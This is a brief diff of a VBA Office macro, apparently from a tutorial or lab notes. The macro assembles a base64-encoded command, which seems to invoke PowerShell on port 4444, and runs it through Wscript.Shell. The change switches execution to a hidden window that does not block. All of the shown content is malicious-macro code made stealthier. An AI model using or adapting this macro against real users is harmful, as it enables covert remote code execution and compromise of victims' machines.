@@ -49,6 +49,6 @@ Sub MyMacro()
     Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
     Str = Str + "A== "
 
-    CreateObject("Wscript.Shell").Run Str
+    CreateObject("Wscript.Shell").Run Str, 0, False
 End Sub
 ```
